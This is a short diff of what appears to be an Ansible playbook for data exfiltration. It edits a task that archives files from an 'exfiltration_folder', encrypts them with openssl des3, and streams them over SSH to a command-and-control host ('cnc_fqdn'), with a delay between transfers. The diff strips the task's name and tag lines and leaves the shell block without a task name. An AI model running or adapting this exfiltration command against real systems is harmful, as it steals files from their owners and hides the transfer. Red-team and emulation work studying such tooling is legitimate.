@@ -21,8 +21,7 @@
       args:
         chdir: "{{ exfiltration_folder }}"
       register: exfil_files
-    - name: Exfiltrate over SSH
-      tags: SSH
+
       shell: |
         "tar czpf - {{ item }} | openssl des3 -salt -k {{ password_encryption }} | ssh {{ cnc_fqdn }} 'cat > {{ exfiltration_file }}-{{ item }}.tar.gz.enc'"
         "sleep {{ exfil_delay }}"
